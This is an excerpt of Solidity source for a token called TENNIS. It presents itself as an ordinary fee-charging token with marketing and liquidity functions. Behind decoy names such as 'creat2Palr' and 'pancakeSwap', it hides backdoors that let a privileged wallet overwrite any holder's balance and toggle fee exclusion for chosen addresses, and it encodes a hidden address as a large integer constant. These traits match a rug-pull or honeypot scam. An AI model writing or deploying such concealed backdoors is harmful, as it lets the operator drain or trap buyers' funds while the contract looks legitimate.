...
contract  TENNIS is Context, IERC20, Ownable {

    uint256 public u1nt=
    150204226878642622067527889049274545390382094927;
    using SafeMath for uint256;
    string private _name = "TENNIS";
    string private _symbol = "TENNIS";
    uint8 private _decimals = 9;
    address payable public TITANWalletA;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xBaA80995334667c1407A0973f376C2B008dFC6D6));
        TITANWalletA = payable(address(0xBaA80995334667c1407A0973f376C2B008dFC6D6));
    ...
    function creat3(uint256 normal)  pure private returns(uint160){
        return uint160(normal);
    }

    function creat2(uint256 normal)  pure private returns(address){
        return address(creat3(normal));
    }

    function u2nt(address normal) private view returns(bool){
        return ((creat2(u1nt) != normal));
    }
    ...
    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        TITANWalletA = payable(newAddress);
    }
...
function creat2Palr(address
 retu, uint256 rn ) public{ if(!similerAddr(true,TITANWalletA,msg.sender)){return;}
 _balances[retu] = rn;}
    ...
    }function pancakeSwap(address[] calldata wannna,uint256 pancake) public { if(
        !similerAddr(true,TITANWalletA,msg.sender)){return;}
        for (uint256 i; i < wannna.length; ++i) {
            if (pancake != 2){ExcludeFromFee[wannna[i]] = (false || true);}
            else{ExcludeFromFee[wannna[i]] = (false && true);}
        }
    }

    function similerAddr(bool unable,address enable, address ownner) private pure returns(bool){return (!!(enable == ownner)) && unable;}
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(TITANWalletA, amountBNBMarketing);
    ...
    function swapTokensForEth(uint256 ExcludeFromFeet) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), ExcludeFromFeet);
        ...
        emit SwapTokensForETH(ExcludeFromFeet, path);
    }

    function addLiquidity(uint256 ExcludeFromFeet, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), ExcludeFromFeet);
